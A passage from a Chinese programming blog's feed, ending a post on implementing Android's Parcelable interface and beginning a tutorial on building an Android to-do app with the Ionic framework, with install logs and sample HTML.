<h2 id="6-Parceable接口定义">6.Parceable接口定义</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Parcelable</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="comment">//内容描述接口，基本不用管</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">describeContents</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//写入接口函数，打包</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel dest, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line">    <span class="comment">//读取接口，目的是要从Parcel中构造一个实现了Parcelable的类的实例处理。因为实现类在这里还是不可知的，所以需要用到模板的方式，继承类名通过模板参数传入</span></span><br><span class="line">    <span class="comment">//为了能够实现模板参数的传入，这里定义Creator嵌入接口,内含两个接口函数分别返回单个和多个继承类实例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Creator</span>&lt;<span class="title">T</span>&gt; </span><br><span class="line">    </span>&#123;</span><br><span class="line">           <span class="function"><span class="keyword">public</span> T <span class="title">createFromParcel</span><span class="params">(Parcel source)</span></span>;</span><br><span class="line">           <span class="keyword">public</span> T[] newArray(<span class="keyword">int</span> size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="7-实现Parcelable步骤">7.实现Parcelable步骤</h2><ol>
<li>implements Parcelable</li>
<li>重写writeToParcel方法，将你的对象序列化为一个Parcel对象，即：将类的数据写入外部提供的Parcel中，打包需要传递的数据到Parcel容器保存，以便从 Parcel容器获取数据</li>
<li>重写describeContents方法，内容接口描述，默认返回0就可以</li>
<li>实例化静态内部对象CREATOR实现接口Parcelable.Creator</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Parcelable.Creator&lt;T&gt; CREATOR</span><br></pre></td></tr></table></figure>
<p>注：其中public static final一个都不能少，内部对象CREATOR的名称也不能改变，必须全部大写。需重写本接口中的两个方法：createFromParcel(Parcel in) 实现从Parcel容器中读取传递数据值，封装成Parcelable对象返回逻辑层，newArray(int size) 创建一个类型为T，长度为size的数组，仅一句话即可（return new T[size]），供外部类反序列化本类数组使用。</p>
<p>简而言之：通过writeToParcel将你的对象映射成Parcel对象，再通过createFromParcel将Parcel对象映射成你的对象。也可以将Parcel看成是一个流，通过writeToParcel把对象写到流里面，在通过createFromParcel从流里读取对象，只不过这个过程需要你来实现，因此写的顺序和读的顺序必须一致。</p>
<p>代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Petrol</span> <span class="keyword">implements</span> <span class="title">Parcelable</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String type;</span><br><span class="line">	<span class="keyword">private</span> String price;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> type;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setType</span><span class="params">(String type)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.type = type;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getPrice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> price;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrice</span><span class="params">(String price)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.price = price;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="annotation">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">describeContents</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="annotation">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel arg0, <span class="keyword">int</span> arg1)</span> </span>&#123;</span><br><span class="line">		arg0.writeString(type);</span><br><span class="line">		arg0.writeString(price);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Parcelable.Creator&lt;Petrol&gt; CREATOR = <span class="keyword">new</span> Parcelable.Creator&lt;Petrol&gt;() &#123;</span><br><span class="line"></span><br><span class="line">		<span class="annotation">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> Petrol <span class="title">createFromParcel</span><span class="params">(Parcel arg0)</span> </span>&#123;</span><br><span class="line">			Petrol p = <span class="keyword">new</span> Petrol();</span><br><span class="line">			p.type = arg0.readString();</span><br><span class="line">			p.price = arg0.readString();</span><br><span class="line">			<span class="keyword">return</span> p;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="annotation">@Override</span></span><br><span class="line">		<span class="keyword">public</span> Petrol[] newArray(<span class="keyword">int</span> arg0) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="8、Serializable实现与Parcelabel实现的区别">8、Serializable实现与Parcelabel实现的区别</h2><ol>
<li>Serializable的实现，只需要implements  Serializable 即可。这只是给对象打了一个标记，系统会自动将其序列化。</li>
<li>Parcelabel的实现，不仅需要implements  Parcelabel，还需要在类中添加一个静态成员变量CREATOR，这个变量需要实现 Parcelable.Creator 接口。</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="1-_什么是Parcelable接口">1. 什么是Parcelable接口</h2><p>序列化是将对象状态转换为可保持或传输的格式的过程。与序列化相对的是反序列化，它将流转换为对象。这两个过程结合起来，可以轻松地存储和传输数据。<br>]]>
    
    </summary>
    
      <category term="Android" scheme="http://science09.github.io/tags/Android/"/>
    
      <category term="Parcelable" scheme="http://science09.github.io/tags/Parcelable/"/>
    
      <category term="Android" scheme="http://science09.github.io/categories/Android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用ionic框架构建Android APP ]]></title>
    <link href="http://science09.github.io/2014/10/29/%E4%BD%BF%E7%94%A8ionic%E6%A1%86%E6%9E%B6%E6%9E%84%E5%BB%BAAndroid-APP/"/>
    <id>http://science09.github.io/2014/10/29/使用ionic框架构建Android-APP/</id>
    <published>2014-10-29T14:46:43.000Z</published>
    <updated>2015-09-10T14:04:06.000Z</updated>
    <content type="html"><![CDATA[<h2 id="一、环境搭建">一、环境搭建</h2><ol>
<li>在安装ionic框架之前，需要先安装nodejs环境，具体可参考本博客之前的文章；</li>
<li>使用命令行安装最新版本的Cordova和Ionic <code>npm install -g cordova ionic</code></li>
<li>安装成功后，可以看到如下打印：</li>
</ol>
<a id="more"></a>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">le</span>&gt;<span class="title">npm</span> <span class="title">install</span> -<span class="title">g</span> <span class="title">cordova</span> <span class="title">ionic</span></span><br><span class="line"><span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">nodejs</span>\<span class="title">ionic</span> -&gt; <span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">nodejs</span>\<span class="title">node_modules</span>\<span class="title">ionic</span>\<span class="title">bin</span>\</span><br><span class="line"><span class="title">ionic</span></span><br><span class="line"><span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">nodejs</span>\<span class="title">cordova</span> -&gt; <span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">nodejs</span>\<span class="title">node_modules</span>\<span class="title">cordova</span>\</span><br><span class="line"><span class="title">bin</span>\<span class="title">cordova</span></span><br><span class="line"><span class="title">ionic</span>@1.2.8 <span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">nodejs</span>\<span class="title">node_modules</span>\<span class="title">ionic</span></span><br><span class="line">├── <span class="title">connect</span>-<span class="title">livereload</span>@0.4.0</span><br><span class="line">├── <span class="title">open</span>@0.0.5</span><br><span class="line">├── <span class="title">ncp</span>@0.4.2</span><br><span class="line">├── <span class="title">progress</span>@1.1.7</span><br><span class="line">├── <span class="title">colors</span>@0.6.2</span><br><span class="line">├── <span class="title">q</span>@1.0.1</span><br><span class="line">├── <span class="title">shelljs</span>@0.2.6</span><br><span class="line">├── <span class="title">cross</span>-<span class="title">spawn</span>@0.2.3 (<span class="title">lru</span>-<span class="title">cache</span>@2.5.0)</span><br><span class="line">├── <span class="title">optimist</span>@0.6.0 (<span class="title">wordwrap</span>@0.0.2, <span class="title">minimist</span>@0.0.10)</span><br><span class="line">├── <span class="title">event</span>-<span class="title">stream</span>@3.0.20 (<span class="title">split</span>@0.2.10, <span class="title">duplexer</span>@0.1.1, <span class="title">stream</span>-<span class="title">combiner</span>@0.0.4,</span><br><span class="line"> <span class="title">pause</span>-<span class="title">stream</span>@0.0.11, <span class="title">map</span>-<span class="title">stream</span>@0.0.4, <span class="title">from</span>@0.1.3, <span class="title">through</span>@2.3.6)</span><br><span class="line">├── <span class="title">finalhandler</span>@0.2.0 (<span class="title">escape</span>-<span class="title">html</span>@1.0.1, <span class="title">debug</span>@2.0.0)</span><br><span class="line">├── <span class="title">form</span>-<span class="title">data</span>@0.1.4 (<span class="title">mime</span>@1.2.11, <span class="title">async</span>@0.9.0, <span class="title">combined</span>-<span class="title">stream</span>@0.0.5)</span><br><span class="line">├── <span class="title">connect</span>@3.1.1 (<span class="title">utils</span>-<span class="title">merge</span>@1.0.0, <span class="title">parseurl</span>@1.3.0, <span class="title">finalhandler</span>@0.1.0, <span class="title">deb</span></span><br><span class="line"><span class="title">ug</span>@1.0.4)</span><br><span class="line">├── <span class="title">tiny</span>-<span class="title">lr</span>-<span class="title">fork</span>@0.0.5 (<span class="title">debug</span>@0.7.4, <span class="title">faye</span>-<span class="title">websocket</span>@0.4.4, <span class="title">qs</span>@0.5.6, <span class="title">noptify</span>@</span><br><span class="line">0.0.3)</span><br><span class="line">├── <span class="title">xml2js</span>@0.4.4 (<span class="title">sax</span>@0.6.1, <span class="title">xmlbuilder</span>@2.4.4)</span><br><span class="line">├── <span class="title">serve</span>-<span class="title">static</span>@1.6.1 (<span class="title">parseurl</span>@1.3.0, <span class="title">utils</span>-<span class="title">merge</span>@1.0.0, <span class="title">escape</span>-<span class="title">html</span>@1.0.1,</span><br><span class="line"> <span class="title">send</span>@0.9.1)</span><br><span class="line">├── <span class="title">request</span>@2.27.0 (<span class="title">aws</span>-<span class="title">sign</span>@0.3.0, <span class="title">cookie</span>-<span class="title">jar</span>@0.3.0, <span class="title">qs</span>@0.6.6, <span class="title">json</span>-<span class="title">stringif</span></span><br><span class="line"><span class="title">y</span>-<span class="title">safe</span>@5.0.0, <span class="title">oauth</span>-<span class="title">sign</span>@0.3.0, <span class="title">forever</span>-<span class="title">agent</span>@0.5.2, <span class="title">tunnel</span>-<span class="title">agent</span>@0.3.0, <span class="title">node</span>-<span class="title">uu</span></span><br><span class="line"><span class="title">id</span>@1.4.1, <span class="title">mime</span>@1.2.11, <span class="title">http</span>-<span class="title">signature</span>@0.10.0, <span class="title">hawk</span>@1.0.0)</span><br><span class="line">├── <span class="title">unzip</span>@0.1.9 (<span class="title">setimmediate</span>@1.0.2, <span class="title">pullstream</span>@0.4.1, <span class="title">match</span>-<span class="title">stream</span>@0.0.2, <span class="title">re</span></span><br><span class="line"><span class="title">adable</span>-<span class="title">stream</span>@1.0.33-1, <span class="title">fstream</span>@0.1.31, <span class="title">binary</span>@0.3.0)</span><br><span class="line">├── <span class="title">prompt</span>@0.2.12 (<span class="title">revalidator</span>@0.1.8, <span class="title">pkginfo</span>@0.3.0, <span class="title">read</span>@1.0.5, <span class="title">winston</span>@0.6.</span><br><span class="line">2, <span class="title">utile</span>@0.2.1)</span><br><span class="line">├── <span class="title">archiver</span>@0.5.1 (<span class="title">lodash</span>@2.4.1, <span class="title">lazystream</span>@0.1.0, <span class="title">readable</span>-<span class="title">stream</span>@1.1.13, <span class="title">z</span></span><br><span class="line"><span class="title">ip</span>-<span class="title">stream</span>@0.1.4, <span class="title">file</span>-<span class="title">utils</span>@0.1.5)</span><br><span class="line">├── <span class="title">vinyl</span>-<span class="title">fs</span>@0.3.7 (<span class="title">graceful</span>-<span class="title">fs</span>@3.0.4, <span class="title">lodash</span>@2.4.1, <span class="title">mkdirp</span>@0.5.0, <span class="title">strip</span>-<span class="title">bom</span>@</span><br><span class="line">1.0.0, <span class="title">vinyl</span>@0.4.3, <span class="title">through2</span>@0.6.3, <span class="title">glob</span>-<span class="title">stream</span>@3.1.15, <span class="title">glob</span>-<span class="title">watcher</span>@0.0.6)</span><br><span class="line">└── <span class="title">npm</span>@2.1.3</span><br><span class="line"></span><br><span class="line"><span class="title">cordova</span>@4.0.0 <span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">nodejs</span>\<span class="title">node_modules</span>\<span class="title">cordova</span></span><br><span class="line">├── <span class="title">q</span>@0.9.7</span><br><span class="line">├── <span class="title">underscore</span>@1.4.4</span><br><span class="line">├── <span class="title">nopt</span>@2.2.1 (<span class="title">abbrev</span>@1.0.5)</span><br><span class="line">└── <span class="title">cordova</span>-<span class="title">lib</span>@4.0.0 (<span class="title">osenv</span>@0.0.3, <span class="title">properties</span>-<span class="title">parser</span>@0.2.3, <span class="title">bplist</span>-<span class="title">parser</span>@0.</span><br><span class="line">0.5, <span class="title">mime</span>@1.2.11, <span class="title">unorm</span>@1.3.3, <span class="title">semver</span>@2.0.11, <span class="title">shelljs</span>@0.3.0, <span class="title">dep</span>-<span class="title">graph</span>@1.1.0, <span class="title">xc</span></span><br><span class="line"><span class="title">ode</span>@0.6.7, <span class="title">glob</span>@3.2.11, <span class="title">npmconf</span>@0.1.16, <span class="title">rc</span>@0.3.0, <span class="title">d8</span>@0.4.4, <span class="title">elementtree</span>@0.1.5, <span class="title">t</span></span><br><span class="line"><span class="title">ar</span>@0.1.20, <span class="title">request</span>@2.22.0, <span class="title">plist</span>@1.0.1, <span class="title">npm</span>@1.3.4, <span class="title">cordova</span>-<span class="title">js</span>@3.7.1)</span><br><span class="line"></span><br><span class="line"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">le</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="二、开始构建APP">二、开始构建APP</h2><p>环境搭建成功后，我们就可以使用ionic的命令来构建AndroidApp的框架，在命令行中执行以下命令：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">D:\Users\myspace&gt;ionic start myApp tabs</span><br><span class="line">Creating Ionic app in folder D:\Users\myspace\myApp based on tabs project</span><br><span class="line"></span><br><span class="line">Downloading: https://github.com/driftyco/ionic-app-base/archive/master.zip</span><br><span class="line">[=============================]  100%  0.0s</span><br><span class="line"></span><br><span class="line">Downloading: https://github.com/driftyco/ionic-starter-tabs/archive/master.zip</span><br><span class="line">[=============================]  100%  0.0s</span><br><span class="line"></span><br><span class="line">Update config.xml</span><br><span class="line">Initializing cordova project</span><br><span class="line">Fetching plugin "org.apache.cordova.device" via plugin registry</span><br><span class="line">npm http GET http://registry.cordova.io/org.apache.cordova.device</span><br><span class="line">npm http 200 http://registry.cordova.io/org.apache.cordova.device</span><br><span class="line">npm http GET http://cordova.iriscouch.com/registry/_design/app/_rewrite/org.apac</span><br><span class="line">he.cordova.device/-/org.apache.cordova.device-0.2.12.tgz</span><br><span class="line">npm http 200 http://cordova.iriscouch.com/registry/_design/app/_rewrite/org.apac</span><br><span class="line">he.cordova.device/-/org.apache.cordova.device-0.2.12.tgz</span><br><span class="line">Fetching plugin "org.apache.cordova.console" via plugin registry</span><br><span class="line">npm http GET http://registry.cordova.io/org.apache.cordova.console</span><br><span class="line">npm http 200 http://registry.cordova.io/org.apache.cordova.console</span><br><span class="line">npm http GET http://cordova.iriscouch.com/registry/_design/app/_rewrite/org.apac</span><br><span class="line">he.cordova.console/-/org.apache.cordova.console-0.2.11.tgz</span><br><span class="line">npm http 200 http://cordova.iriscouch.com/registry/_design/app/_rewrite/org.apac</span><br><span class="line">he.cordova.console/-/org.apache.cordova.console-0.2.11.tgz</span><br><span class="line">Fetching plugin "com.ionic.keyboard" via plugin registry</span><br><span class="line">npm http GET http://registry.cordova.io/com.ionic.keyboard</span><br><span class="line">npm http 200 http://registry.cordova.io/com.ionic.keyboard</span><br><span class="line">npm http GET http://cordova.iriscouch.com/registry/_design/app/_rewrite/com.ioni</span><br><span class="line">c.keyboard/-/com.ionic.keyboard-1.0.3.tgz</span><br><span class="line">npm http 200 http://cordova.iriscouch.com/registry/_design/app/_rewrite/com.ioni</span><br><span class="line">c.keyboard/-/com.ionic.keyboard-1.0.3.tgz</span><br><span class="line"></span><br><span class="line">Your Ionic project is ready to go! Some quick tips:</span><br><span class="line"></span><br><span class="line"> * cd into your project: $ cd myApp</span><br><span class="line"></span><br><span class="line"> * Setup this project to use Sass: ionic setup sass</span><br><span class="line"></span><br><span class="line"> * Develop in the browser with live reload: ionic serve</span><br><span class="line"></span><br><span class="line"> * Add a platform (ios or Android): ionic platform add ios [android]</span><br><span class="line">   Note: iOS development requires OS X currently</span><br><span class="line">   See the Android Platform Guide for full Android installation instructions:</span><br><span class="line">   https://cordova.apache.org/docs/en/edge/guide_platforms_android_index.md.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Build your app: ionic build &lt;PLATFORM&gt;</span><br><span class="line"></span><br><span class="line"> * Simulate your app: ionic emulate &lt;PLATFORM&gt;</span><br><span class="line"></span><br><span class="line"> * Run your app on a device: ionic run &lt;PLATFORM&gt;</span><br><span class="line"></span><br><span class="line"> * Package an app using Ionic package service: ionic package &lt;MODE&gt; &lt;PLATFORM&gt;</span><br><span class="line"></span><br><span class="line">For more help use ionic --help or visit the Ionic docs: http://ionicframework.co</span><br><span class="line">m/docs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">D:\Users\myspace&gt;</span><br></pre></td></tr></table></figure></p>
<p>命令执行成功后，会在当前目录下生产myApp的文件夹，打开myApp文件夹，ionic框架已经帮我们自动生成了Android App需要的基本框架。框架自动生成的文件如下：</p>
<p><img src="C:\Users\le\Pictures\ionic_framework.png" alt=""></p>
<p>该框架自动产生代码文件还不能直接在Android环境上运行，接着构建能在Android上运行的App，在命令行执行以下命令：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Users</span>\<span class="title">myspace</span>&gt;<span class="title">cd</span> <span class="title">myApp</span></span><br><span class="line"><span class="title">D</span>:\<span class="title">Users</span>\<span class="title">myspace</span>&gt;<span class="title">ionic</span> <span class="title">platform</span> <span class="title">add</span> <span class="title">android</span></span><br><span class="line"><span class="title">D</span>:\<span class="title">Users</span>\<span class="title">myspace</span>&gt;<span class="title">ionic</span> <span class="title">build</span> <span class="title">android</span></span><br><span class="line"><span class="title">D</span>:\<span class="title">Users</span>\<span class="title">myspace</span>&gt;<span class="title">ionic</span> <span class="title">emulate</span> <span class="title">android</span></span></span><br></pre></td></tr></table></figure>
<p>如果上面的每一步都构建成功的话，则可以看到ionic帮我们启动Android模拟器，并自动把该App安装到Android模拟器中，我们来看下执行后的效果：</p>
<p><img src="C:\Users\le\Pictures\myApp.png" alt=""></p>
<p>是不是很简单！ionic框架自动帮我们生产了App，接下来我们主要是关注自身的业务和逻辑，修改代码，使得该App能满足我们的需求。</p>
<p>三、构建自定义的APP</p>
<p>我们根据ionic提供的框架，来开发一个ToDoList的应用程序。使用Ionic提供的框架，创建一个空白的App，使用blank命令即可创建一个空白App；</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Users</span>\<span class="title">myspace</span>&gt;<span class="title">ionic</span> <span class="title">start</span> <span class="title">ToDoList</span> <span class="title">blank</span></span></span><br></pre></td></tr></table></figure>
<p>3.1) 创建一个ListItem，在www/index.html文件中的<ion-content> </ion-content> 中间加入一下代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">ion-list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">ion-item</span>&gt;</span>Scuba Diving<span class="tag">&lt;/<span class="title">ion-item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">ion-item</span>&gt;</span>Climb Mount Everest<span class="tag">&lt;/<span class="title">ion-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">ion-list</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>在index.html文件中加入<code>ion-list</code>后，整个html文件的代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">meta</span> <span class="attribute">charset</span>=<span class="value">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"viewport"</span> <span class="attribute">content</span>=<span class="value">"initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">title</span>&gt;</span><span class="tag">&lt;/<span class="title">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="title">link</span> <span class="attribute">href</span>=<span class="value">"lib/ionic/css/ionic.css"</span> <span class="attribute">rel</span>=<span class="value">"stylesheet"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">link</span> <span class="attribute">href</span>=<span class="value">"css/style.css"</span> <span class="attribute">rel</span>=<span class="value">"stylesheet"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- IF using Sass (run gulp sass first), then uncomment below and remove the CSS includes above</span><br><span class="line">    &lt;link href="css/ionic.app.css" rel="stylesheet"&gt;</span><br><span class="line">    --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- ionic/angularjs js --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"lib/ionic/js/ionic.bundle.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- cordova script (this will be a 404 during development) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"cordova.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- your app's js --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"js/app.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">body</span> <span class="attribute">ng-app</span>=<span class="value">"starter"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="title">ion-pane</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">ion-header-bar</span> <span class="attribute">class</span>=<span class="value">"bar-stable"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">h1</span> <span class="attribute">class</span>=<span class="value">"title"</span>&gt;</span>Ionic Blank Starter<span class="tag">&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="title">ion-header-bar</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">ion-content</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">ion-list</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="title">ion-item</span>&gt;</span>Scuba Diving<span class="tag">&lt;/<span class="title">ion-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="title">ion-item</span>&gt;</span>Climb Mount Everest<span class="tag">&lt;/<span class="title">ion-item</span>&gt;</span></span><br><span class="line">    